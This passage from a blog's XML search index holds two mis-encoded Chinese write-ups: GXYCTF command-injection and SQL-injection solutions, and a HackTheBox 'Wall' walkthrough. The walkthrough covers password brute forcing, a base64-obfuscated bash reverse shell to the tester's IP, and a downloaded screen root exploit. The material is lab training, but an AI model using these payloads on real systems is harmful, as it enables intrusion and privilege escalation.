ä¸­æœ‰ä¸€ä¸ª$aå˜é‡å¯ä»¥è¦†ç›–ï¼Œé‚£ä¹ˆpayloadå°±å‡ºæ¥äº†ï¼š</p><pre><code>/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code></pre><p>ç„¶åæœ‰å®˜æ–¹ä¸å…¶ä»–å¤§ä½¬çš„é«˜ç«¯è§£æ³•ï¼š<br>å®˜æ–¹ï¼š</p><pre><code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></pre><p>è¿‡æ»¤bash?é‚£å°±ç”¨shã€‚shçš„å¤§éƒ¨åˆ†è„šæœ¬éƒ½å¯ä»¥åœ¨bashä¸‹è¿è¡Œã€‚</p><p>dalao<br>å†…è”æ‰§è¡Œçš„åšæ³•ï¼Œåªèƒ½è¯´V&amp;Nçš„å¸ˆå‚…ä»¬å¤ªå¼ºäº†ã€‚</p><pre><code>http://530bbcaf-9d64-494e-8993-bb3727c31a5a.node3.buuoj.cn/?ip=127.0.0.1;cat$IFS$9`ls`</code></pre><p>å†…è”ï¼Œå°±æ˜¯å°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œã€‚<br>ç§’é¢˜å¤§æ¦‚å°±æ˜¯è¿™ç§åšæ³•å§â€¦â€¦</p><h1 id="BabySqli"><a href="#BabySqli" class="headerlink" title="BabySqli"></a>BabySqli</h1><p>è¿›å»åä¸€ä¸ªè´¦å·ï¼Œå¯†ç è¾“å…¥æ¡†ã€‚å…ˆéšä¾¿è¾“ä¸‹ï¼Œæç¤ºwrong passã€‚ä½†æ˜¯çœ‹æºç æœ‰æ„å¤–æ”¶è·<img src="/2020/01/13/GXYCTF-PingPingPing-BabySqli/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="FUZZ"><br>ä»å½¢å¼ä¸Šçœ‹æ•°å­—æˆåˆ†éƒ½æ²¡æœ‰è¶…è¿‡6,å¯èƒ½æ˜¯base32ï¼Œè§£ç åå¾—åˆ°ä¸€ä¸ªbase64ç¼–ç ï¼Œè§£ç åå¾—åˆ°ä»¥ä¸‹:</p><pre><code>select * from user where username = &#39;$name&#39;</code></pre><p>é‚£ä¹ˆå°±å¯ä»¥åœ¨usernameè¿™ä¸ªæ³¨å…¥ç‚¹ä¸‹æ‰‹å¤„ç†äº†ã€‚è¿™é“é¢˜ç›®åªè¿‡æ»¤äº†åŸºæœ¬çš„andä¸ç­‰å·è¿˜æ˜¯å¾ˆèƒ½æ“ä½œçš„ã€‚ä¸è¿‡åæ¥çœ‹åˆ«äººè¯´è¿™é¢˜è€ƒç‚¹åœ¨MD5æŸ¥è¯¢ç»•è¿‡ã€‚è¿™ä¹ˆè¯´çš„åŸå› æ˜¯ï¼Œå°±ç®—æˆåŠŸæ³¨å…¥æŠŠadminå¯†ç çš„MD5æ‹¿åˆ°ï¼Œå› ä¸ºè§£ä¸äº†çš„ç¼˜æ•…ç­‰äºæ²¡ç”¨ã€‚åŸºäºé¢˜ç›®æç¤ºçš„wrong passï¼Œé‚£ä¹ˆå¤§æ¦‚ç‡æ˜¯ç›´æ¥æ‹¿è¾“å…¥å¯†ç çš„MD5æ•°å€¼è·Ÿæ•°æ®åº“é‡Œå·²çŸ¥å€¼æ¯”è¾ƒã€‚</p><p>ç¨å¾®FUZZä¸€ä¸‹<code>admin&#39; union select 1,2,3</code>å¯ä»¥ç¡®è®¤æœ‰ä¸‰ä¸ªå­—æ®µ<br>åé¢ç¡®è®¤å¤§æ¦‚æ˜¯id,adminï¼Œpasswdä¸‰ä¸ªå­—æ®µã€‚è¿™é‡Œä¸ºäº†ç»•è¿‡ï¼Œéœ€è¦ä¿è¯æˆ‘ä»¬çš„æŸ¥è¯¢ç»“æ„ä¸€è‡´ï¼Œå°±å¯ç›´æ¥select æƒ³è¦çš„è¿”å›å€¼ã€‚<br>é‚£ä¹ˆæ„é€ ä¸€ä¸ªä¸ºå‡çš„æŸ¥è¯¢-1ï¼Œåé¢æ¥ä¸Šè”åˆæŸ¥è¯¢ï¼š</p><pre><code>-1&#39; union select 1,&#39;admin&#39;,&#39;7363a0d0604902af7b70b271a0b96480&#39;#</code></pre><p>å¯†ç è¾“123å³å¯</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Wall</title>
      <link href="2020/01/12/hackthebox-Wall/"/>
      <url>2020/01/12/hackthebox-Wall/</url>
      
        <content type="html"><![CDATA[<p> æ€»ç®—æ˜¯æŒºè¿‡äº†æœŸæœ«12é—¨çš„é­”é¬¼è€ƒè¯•æ—¥ç¨‹ï¼Œè¿æ¥äº†å¯’å‡â€¦â€¦è¿™æ¬¡å¯’å‡æ‰“ç®—å­¦çš„è¿˜æŒºå¤šçš„ï¼Œä¹Ÿå¸Œæœ›è‡ªå·±èƒ½åšæŒå­¦ä¹ ï¼ŒæŠŠçŸ¥è¯†å°½é‡èä¼šè´¯é€šå§ã€‚ä¹‹å‰æ›¾è¯´è¿‡å¸Œæœ›èƒ½æ—©æ—¥æ‹¿ä¸‹è‡ªå·±åœ¨hacktheboxä¸Šçš„ç¬¬ä¸€å°é¶æœºï¼Œæ²¡æƒ³åˆ°è¿™ä¹ˆå¿«å°±åœ¨å¸®åŠ©ä¸‹æ‹¿åˆ°æ‰‹äº†ã€‚å…¶å®åœ¨è¿›å…¥æœŸæœ«å¤ä¹ é˜¶æ®µä¸­çš„ä¸€æ®µæ—¶é—´ï¼Œè‡ªå·±å°±å‚è€ƒyoutubeä¸Šä¸€ä½ä¼˜ç§€çš„hacker youtuberå…³äºhacktheboxçš„è§†é¢‘æˆåŠŸæ‹¿åˆ°äº†é¶æœºï¼Œåªä¸è¿‡ä¸€ç›´æ²¡å†™æ–‡ç« ã€‚è€Œç°åœ¨è¿™å°Wallé¶æœºåœ¨hacktheboxä¸Šä¹Ÿå·²ç»å¤„äºä¸‹æ¶çŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘å°±ç®€å•è®°å½•ä¸€ä¸‹æ‹¿ä¸‹Wallçš„è¿‡ç¨‹ï¼Œæ²¡æ³•è´´å®æ“å›¾äº†ã€‚</p><a id="more"></a><p>å‚è€ƒçš„youtuber:IppSec  <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA" target="_blank" rel="noopener">https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA</a><br>å¹¸å¥½è‡ªå·±è‹±è¯­æ°´å¹³è¿‡ç¡¬ï¼Œå¯ä»¥å•ƒä»–çš„ç”Ÿè‚‰è§†é¢‘ã€‚æ„Ÿè°¢è¿™ä½å¤§ä½¬ï¼Œç¡®å®å¸®åˆ°äº†æˆ‘å¾ˆå¤šã€‚</p><p><img src="/2020/01/12/hackthebox-Wall/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Wall"><br><strong>æœ¬æœºip:10.10.14.3</strong><br>(ä¹Ÿè®¸å§,è®°ä¸å¾—äº†hhh)<br><strong>é¶æœºip:10.10.10.157</strong></p><p>ç„¶åå›é¡¾ä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹å§ã€‚é¦–å…ˆç¬¬ä¸€æ­¥å½“ç„¶æ˜¯ä½¿ç”¨hacktheboxæä¾›ç»™æˆ‘ä»¬çš„ovpnè¿æ¥ã€‚è¿™æ ·æˆ‘ä»¬å°±åˆ›å»ºå¥½äº†ä¸é¶æœºä¹‹é—´çš„è™šæ‹Ÿä¸“æœ‰ç½‘ç»œã€‚å¯ä»¥è®¿é—®åˆ°é¢˜ç›®ã€‚</p><p>ä¹‹åå°±æ˜¯é¢å¯¹hacktheboxä¸Šä¸€ä¼—é¶æœºçš„å¸¸è§„å¥—è·¯ï¼šä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æï¼ˆè¿™åº”è¯¥ä¹Ÿæ˜¯æ­£å¸¸æ¸—é€è¿‡ç¨‹ä¸­çš„ç¬¬ä¸€æ­¥ï¼‰</p><pre><code>namp -sC -sV -oA namp/wall 10.10.10.157</code></pre><p>æˆ‘å­¦ä¹ äº†ä¸‹é‚£ä½youtuberçš„å¥½ä¹ æƒ¯ï¼Œè¿™é‡Œnampä¸ä»…åšäº†æ‰«æï¼ŒåŒæ—¶è¿˜ä¿å­˜ä¸ºæ–‡ä»¶æ–¹ä¾¿å›é¡¾ã€‚</p><p>ä¹‹åå‘ç°å¼€æ”¾äº†ä¸¤ä¸ªç«¯å£ï¼Œ80ä¸22,ä¹Ÿå°±æ˜¯httpä¸sshå¯¹åº”æœåŠ¡ã€‚å°è¯•ç›´æ¥è®¿é—®ï¼Œä¹Ÿå¾—åˆ°äº†apacheçš„é»˜è®¤é¡µé¢ã€‚åŸºäºsshå¹¶æ— å¤ªå¤šåˆ©ç”¨ä¹‹å¤„ï¼Œå¯ä»¥ç›´æ¥ä»webé¡µé¢ä¸‹æ‰‹ã€‚<br>é‚£ä¹ˆå…ˆæ‰«ä¸‹ç›®å½•ï¼Œæ¥çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯èƒ½æœ‰è¶£çš„,åœ¨ç®€å•çš„FUZZä¸€ä¸‹robots.txt,.htacesséƒ½æ— ç»“æœåï¼Œæœæ–­ä½¿ç”¨gobusterï¼š</p><pre><code>gobuster dir -u http://10.10.10.157/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </code></pre><p>æ‰«åˆ°äº†ä¸€ä¸ª/monitoringï¼Œå°è¯•è®¿é—®ï¼Œå´å‘ç°æç¤ºunauthorizedã€‚å¹¶æç¤ºè¾“å…¥ç”¨æˆ·å¯†ç ï¼Œå°è¯•ä¸‹admin-admin,admin-password,guest-guestç­‰ç­‰å¯èƒ½çš„å¼±å£ä»¤æ— æœï¼Œäºæ˜¯å¾—å¦è¾Ÿè¹Šå¾„ã€‚<br>é¡ºä¾¿è¡¥ä¸€ä¸‹webAPIä¸­authorizeè·Ÿauthenticationçš„åŒºåˆ«ï¼š</p><pre><code>èº«ä»½éªŒè¯ï¼ˆAuthenticationï¼‰ï¼šç¡®å®šç”¨æˆ·æ˜¯è°ã€‚æˆæƒ(Authorization)ï¼šç¡®å®šç”¨æˆ·èƒ½åšä»€ä¹ˆï¼Œä¸èƒ½åšä»€ä¹ˆã€‚</code></pre><p>è¿™é‡Œä»dalaoé‚£å­¦åˆ°äº†ä¸€æ‹›ï¼šæŠ“åŒ…åï¼Œå½“ä»¥GETæ–¹å¼è®¿é—®/monitoringæ—¶ï¼Œæˆ‘ä»¬å¾—åˆ°çš„æ˜¯401 unauthorized,ä½†å¦‚æœä»¥POSTæ–¹å¼è®¿é—®ï¼Œå°±ä¼šçš„åˆ°é¡µé¢æç¤ºï¼Œå¹¶æ‹¿åˆ°åç»­æ“ä½œçš„é¡µé¢ç›®å½•  /centreon</p><p>å†åº¦è®¿é—®ï¼Œç»ˆäºå¾—åˆ°ä¸€ä¸ªcentreonçš„ç™»å½•ç•Œé¢ï¼ŒåŒæ—¶ç‰ˆæœ¬ä¸º19.04.0é‚£ä¹ˆé—®é¢˜å°±å›åˆ°ç”¨æˆ·å¯†ç ä¸Šäº†ã€‚<br>ä¸ºäº†èƒ½äº†è§£è¿™ä¸€ç³»ç»Ÿï¼Œå½“ç„¶éœ€è¦è°·æ­Œäº†è§£ä¸‹centreonåˆ°åº•ä¸ºä½•ç‰©ï¼Œä»¥åŠæœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ã€‚å¾ˆå¿«å°±å¯ä»¥å‘ç°ï¼Œè¿™ä¸€ç‰ˆæœ¬å­˜åœ¨æœ‰sqlæ³¨å…¥ï¼ŒRCEå‘½ä»¤æ‰§è¡Œç­‰ç­‰æ¼æ´ï¼›æˆ–è€…ä½¿ç”¨kaliä¸Šçš„searchspolit<br><code>searchsploit centreon</code><br>å‘ç°æœ‰RCEç­‰ç­‰æ¼æ´ä»¥åŠåˆ©ç”¨ï¼Œæˆ‘ä»¬å¯¹RCEgetshellç›¸å¯¹æ¯”è¾ƒè½»æ¾ï¼Œé‚£ä¹ˆå°±ä¸å¦¨çœ‹çœ‹RCEçš„åˆ©ç”¨<br><code>searchsploit  -x &quot;æ­¤å¤„æ¥åˆ©ç”¨çš„è„šæœ¬æ–‡ä»¶åœ°å€&quot;</code><br>ä»”ç»†å®¡è¿‡åå‘ç°ï¼Œä»ä¸Šé¢æåˆ°çš„ç§ç§æ¼æ´åˆ°ç°åœ¨å…·ä½“çš„RCEï¼Œæˆ‘ä»¬éƒ½éœ€è¦åœ¨autheticatedçš„å‰æä¸‹åˆ©ç”¨ï¼Œé‚£ä¹ˆè¿˜æ˜¯å¾—ä»ç™»é™†ç•Œé¢çš„ç”¨æˆ·å¯†ç ä¸‹æ‰‹ã€‚</p><p>è¿™é‡Œåˆä»å¤§ä½¬é‚£å­¦åˆ°äº†ç¬¬äºŒæ‹›ï¼šåœ¨ç™»å½•ç•Œé¢éšä¾¿è¾“å…¥å°è¯•ç™»å½•å¹¶æŠ“åŒ…æ—¶ï¼Œä¼šå‘ç°burpæŠ“åŒ…å¾—å†…å®¹é™¤äº†admin,passwordå‚æ•°ï¼Œè¿˜ä¼šæœ‰centreonè‡ªå¸¦çš„tokenã€‚è¿™å°±ç»™æˆ‘ä»¬çš„æš´åŠ›ç ´è§£å¯èƒ½æ€§ç”»ä¸Šäº†å¥å·ã€‚é‚£ä¹ˆè¿˜æœ‰å…¶ä»–æ–¹æ³•çˆ†ç ´å—ï¼Ÿæœ‰çš„ï¼Œé€šè¿‡APIæ¥å°è¯•ï¼š googleåå‘ç°ç¡®å®å­˜åœ¨centreonçš„api,è€Œä¸”ç¡®å®åªä¼ äº†username,passwordä¸¤ä¸ªå‚æ•°ï¼Œæ˜¯å¯ä»¥çˆ†ç ´çš„ã€‚<br>ä¹‹åç»§ç»­FUZZï¼Œäºæ˜¯å‡†å¤‡postè®¿é—®ï¼š</p><pre><code>/centreon/api/index.php?action=authenticate </code></pre><p>å¹¶é¡ºä¾¿ä¼ å‚admin=admin&amp;password=passowrdã€‚å‘ç°è¿”å›bad crendentialsã€‚å¹¶ä¸”æ”¹æ‰usernameå‚æ•°æ—¶è¿”å›çš„æ˜¯ä¸€è‡´çš„ï¼Œè¿™æ ·å°±ä¸å¥½é€šè¿‡responseæ¥çˆ†ç ´ã€‚é‚£åªèƒ½çŒœæµ‹ç”¨æˆ·åæ˜¯adminäº†ã€‚</p><pre><code>wfuzz  http://10.10.10.157/centreon/api/index.php?action=authenticate -w /usr/share/seclist/Passwords/darkweb2017-top1000.txt  -d &quot;username=admin&amp;password=FUZZ&quot; --hc 403</code></pre><p>â€“hc å¯ä»¥ç­›æ‰è¿”å›403çš„ç»“æœã€‚<br>ä¸Šé¢ç”¨çš„è¿™ä¸ªå­—å…¸æˆ‘å¥½åƒkaliä¸Šå¹¶æ²¡æœ‰ï¼Œåªèƒ½è‡ªå·±æ‰¾å­—å…¸ç”¨äº†ã€‚<br>å¾ˆå¿«å¾—åˆ°æ­£ç¡®çš„å¯†ç  password1â€¦â€¦è¿™ä¸ªå¼±å£ä»¤çœŸçš„æ˜¯å¼ºï¼Œç®€å•å½’ç®€å•ï¼Œæ€»å½’äººæ‰‹FUZZåº”è¯¥ä¸å¤ªèƒ½FUZZå‡ºæ¥â€¦â€¦</p><p>ä¹‹åå°±æˆåŠŸç™»é™†ï¼Œè½®åˆ°æˆ‘ä»¬å¤§å±•èº«æ‰‹äº†ã€‚åœ¨ç½‘ä¸Šå¯ä»¥æŸ¥åˆ°å¾ˆå¤šç§åˆ©ç”¨ï¼Œæˆ‘å‚è€ƒäº†dalaoçš„é‚£ç§å‘½ä»¤æ‰§è¡Œï¼ˆåƒè¿™ç§æ§åˆ¶å°é‡Œçš„ç¡®å­˜åœ¨å¾ˆå¤šå¯ä»¥æ³¨å…¥åˆ©ç”¨çš„åœ°æ–¹ï¼‰åœ¨centreonçš„configurationä¸­å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ,ç®€å•è¯•ä¸‹</p><pre><code>ping -c 1 127.0.0.1;</code></pre><p>linuxçš„pingè²Œä¼¼ä¸windowsæœ‰åŒºåˆ«ã€‚<br>ç„¶è€Œåœ¨å‘½ä»¤æ‰§è¡Œæ—¶å¤±è´¥äº†å¹¶è¿”å›403ã€‚ç»§ç»­å°è¯•å…¶ä»–çš„å‘ç°å¯èƒ½æ˜¯è¿‡æ»¤äº†ç©ºæ ¼ã€‚äºæ˜¯ä½¿ç”¨å¸¸è§çš„ä¸€ç§ç»•è¿‡æ‰‹æ®µï¼š<code>${IFS}</code>ç»•è¿‡ç©ºæ ¼ã€‚<br>å¦å¤–ï¼Œæˆ‘è¿˜å­¦åˆ°äº†æœ‰åˆ«äºè‡ªå·±åŸæ¥åƒåœ¾çš„æŠŠç©ºæ ¼ä¸€ä¸ªä¸ªæ¢æˆ${IFS}çš„æ‰‹æ®µã€‚ç›´æ¥åœ¨linuxå‘½ä»¤è¡Œä¸­</p><pre><code>echo &#39;ping -c 1 127.0.0.1;&#39;|sed  &#39;s/ /${IFS}/g&#39;</code></pre><p>å°±å¾—åˆ°äº†payload ,å†åº¦æ”¾åœ¨åˆšåˆšçš„å‘½ä»¤æ‰§è¡Œç©ºæ ¼ä¸­ï¼Œä¿å­˜ï¼Œå¹¶export configurationä»¥æ‰§è¡Œå‘½ä»¤ã€‚å‘ç°æˆåŠŸäº†ã€‚<br>æ—¢ç„¶æµ‹è¯•å¥½äº†ï¼Œé‚£æˆ‘ä»¬å°±ç›´æ¥getshellå§ã€‚<br>åŸpayload:</p><pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.3/8888 0&gt;&amp;1&#39;</code></pre><p>è¿™é‡Œbash -c æ˜¯ç›´æ¥å°†åé¢çš„å­—ç¬¦ä¸²å†…å®¹æ‰§è¡Œå‘½ä»¤ã€‚è€Œåé¢bash -iç­‰ç­‰å°±æ˜¯bashåå¼¹shellçš„å‘½ä»¤äº†ã€‚(è¿™é‡Œè‡ªå·±å…¶å®è‡ªå­¦äº†å¥½ä¹…ï¼Œä¹ŸæŠ˜è…¾äº†ä¸æ™’æ—¶é—´æ‰æˆåŠŸåœ¨kaliä¸Šæ‹¿åˆ°è‡ªå·±çš„ä¸€å°å…¬ç½‘vpsçš„shellï¼Œä¹‹åå¦‚æœå†™å­¦ä¹ ç¬”è®°å†è¯¦ç»†è§£é‡Šç†è§£ä¸‹)<br>è¿™é‡Œä¸å¦¨ç”¨base64ç¼–ç ä¸‹ç»•æ£€æŸ¥,æˆ‘ä¹Ÿä¸è®°å¾—è¿™é‡Œä¸ç”¨base64ç¼–ç æ˜¯å¦ä¼šäº§ç”Ÿè¢«è¿‡æ»¤bashçš„é—®é¢˜ï¼Œä½†æ¯•ç«Ÿbashæ˜¯é«˜å±å‘½ä»¤ï¼Œè¿˜æ˜¯æ‰§è¡Œç¼–ç ä¸ºå¦™ã€‚</p><pre><code>echo &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.3/8888 0&gt;&amp;1&#39; &quot;|base 64</code></pre><p>å¾—åˆ°ï¼š</p><pre><code>YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc=</code></pre><p>é‚£ä¹ˆç»•è¿‡ç©ºæ ¼ï¼š</p><pre><code>echo &quot;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc= | base4 -d | bash&quot; |sed &#39;s/ /${IFS}/g&#39;</code></pre><p>ç°payload:</p><pre><code>echo${IFS}YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc=${IFS}|${IFS}base4${IFS}-d${IFS}|${IFS}bash;</code></pre><p>è®°å¾—æœ€åè¦æœ‰åˆ†å·ã€‚ä¹‹ååœ¨è‡ªå·±kaliä¸Šç›‘å¬8888ç«¯å£ï¼š</p><pre><code>nc -lvp 8888</code></pre><p>å‘½ä»¤æ‰§è¡Œå³å¯getshellã€‚</p><h2 id="æ‹¿-user-æƒé™"><a href="#æ‹¿-user-æƒé™" class="headerlink" title="æ‹¿ user æƒé™"></a>æ‹¿ user æƒé™</h2><p>hacktheboxçš„é¶æœºæ‹¿ä¸‹ï¼Œå¹¶ä¸åªæ˜¯ç®€å•çš„getshell,è€Œæ˜¯è¦åˆ†åˆ«æ‹¿åˆ°rootæƒé™ä¸useræƒé™ä¸‹çš„ä¸¤ä¸ªæ–‡ä»¶ä¸­çš„flagæäº¤æ‰ç®—æˆåŠŸã€‚è¿™é‡Œè‡ªå·±å› ä¸ºæ²¡ä»€ä¹ˆææƒç»éªŒï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šå‚è€ƒäº†ä¸å°‘wpä¸è§†é¢‘æ‰ç®—æˆåŠŸã€‚<br>å…ˆä»ç®€å•çš„userå¼€å§‹ï¼š</p><pre><code>ls -la </code></pre><p>å‘ç°useræœ‰shelbyä¸sysmonitorä¸¤ä¸ªã€‚æ‰¾ä¸€ä¸‹shelbyçš„å†…å®¹åå‘ç°åªæœ‰shelbyæœ‰æƒé™è¯»user.txtå³flagã€‚<br>ç»è¿‡ä¸€ç•ªæŒ–æ˜ï¼Œå¯ä»¥å‘ç°èƒ½å¤Ÿæ‰¾åˆ°/opt/.shelby/backupè¿™ä¸€æ–‡ä»¶ã€‚<code>file backup</code>åå‘ç°æ˜¯ä¸€ä¸ªpythonç¼–è¯‘æ–‡ä»¶ï¼Œå¯èƒ½å°±æ˜¯pycå§ã€‚æ‰§è¡Œä¸‹<code>python backup</code><br>è¿™æ—¶æˆ‘ä»¬å¦‚æœå†ls -laï¼Œå°±ä¼šå‘ç°æˆ‘ä»¬ä¸çŸ¥æ€ä¹ˆå·²ç»å®Œæˆäº†authenticationã€‚<br>è¿›å…¥ç›®å½•ã€‚</p><pre><code>base64 backup</code></pre><p>å°†ç»“æœåœ¨æœ¬æœºçš„vimä¿å­˜ä¸ºbackup.pyc.b64ï¼Œå†base64è§£ç ï¼Œè¿™æ ·è¿™æ ·ä¸€ä¸ªpycæ–‡ä»¶å°±ç®—åˆ°äº†æœ¬æœºäº†ã€‚ç„¶åæˆ‘ä»¬ç”¨python çš„uncompyleåº“åç¼–è¯‘ä¸€ä¸‹ã€‚è¿˜åŸäº†pyæ–‡ä»¶ã€‚<br>ä»å…¶ä¸­ç›´æ¥æ‹¿åˆ°shelby çš„å¯†ç  ShelbyPassw@rdIsStrong!<br>sshç™»å½•shelbyå³å¯è¯»user.txtã€‚</p><h2 id="æ‹¿-root-æƒé™"><a href="#æ‹¿-root-æƒé™" class="headerlink" title="æ‹¿ root æƒé™"></a>æ‹¿ root æƒé™</h2><p>æ‹¿rootæƒé™æ—¶æˆ‘å°±æ¯”è¾ƒå°´å°¬äº†ï¼Œå› ä¸ºè¿™é‡Œrootçš„payloadå¯ä»¥ç›´æ¥æ‹¿åˆ°rootè·ŸshelbyäºŒè€…çš„æƒé™ã€‚<br>å‚è€ƒäº†ä¸€ä¸ªè§£æ³•ï¼š</p><blockquote><p>/bin/screen-4.5.0<br>For this exact version there is a vulnerability that allows to escalate to root</p></blockquote><p>è¿™é‡Œ/binä¸‹çš„screenç‰ˆæœ¬å…è®¸æˆ‘ä»¬ç›´æ¥åˆ©ç”¨æ¼æ´æ‹¿åˆ°rootæƒé™ã€‚payloadåœ¨æ­¤ï¼š<a href="https://github.com/XiphosResearch/exploits/tree/master/screen2root" target="_blank" rel="noopener">https://github.com/XiphosResearch/exploits/tree/master/screen2root</a><br>é‚£æ¥ä¸‹æ¥åªç”¨æŠŠè„šæœ¬æ”¾åˆ°æˆ‘ä»¬æ‹¿åˆ°shellçš„æœºå­æ‰§è¡Œscreenroot.shå³å¯ã€‚é‚£ä¹ˆå¦‚ä½•ä¼ è¾“æ–‡ä»¶å‘¢ï¼Ÿè¿™é‡Œè¿ç”¨åˆ°äº†pythonå¼ºå¤§çš„åŠŸèƒ½ï¼Œä¹Ÿæ˜¯è‡ªå·±ä¹‹å‰æ›¾ç”¨è¿‡çš„SimpleHTTPServer</p><pre><code>python -m SimpliHTTPServer</code></pre><p>è¿™æ ·å°±é»˜è®¤ç›‘å¬8000ç«¯å£äº†ï¼Œå…ˆæŠŠè„šæœ¬æ”¾åœ¨æ ¹ç›®å½•ã€‚å°è¯•<code>curl 10.10.14.3:8000/screenroot.sh</code>å¤±è´¥,æ²¡æœ‰å®‰è£…curlã€‚å†å°è¯•<code>wget 10.10.14.3:8000/screenroot.sh</code>æˆåŠŸï¼Œåœ¨é¶æœºshellæ‹¿åˆ°è„šæœ¬ã€‚</p><pre><code>bash screenroot.sh</code></pre><p>è¿è¡ŒæˆåŠŸï¼Œè¿›å…¥shellçš„äº¤äº’é¡µé¢ã€‚cat /root/root.txtå³å¯ï¼Œè¿˜å¯ä»¥cat /home/shelby/user.txtæ‹¿åˆ°ä¹‹å‰çš„userflagã€‚</p><p>å¤§æŠµå¦‚æ­¤å§ã€‚å½“æ—¶å³ä½¿åœ¨å‚è€ƒï¼Œè‡ªå·±ä¹ŸèŠ±äº†ä¸å°‘æ—¶é—´åœ¨getshellåçš„ææƒä¸Šï¼Œçœ‹æ¥è‡ªå·±è¿˜è¦å†å¤šåŠ äº†è§£å­¦ä¹ å‘€ã€‚å¯’å‡å·²ç»å¼€å§‹ï¼Œæˆ‘ä¹Ÿäº‰å–å†æ‹¼ä¸€æŠŠï¼Œå¤šå­¦ä¸€äº›webæ–¹é¢çš„çŸ¥è¯†å§ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
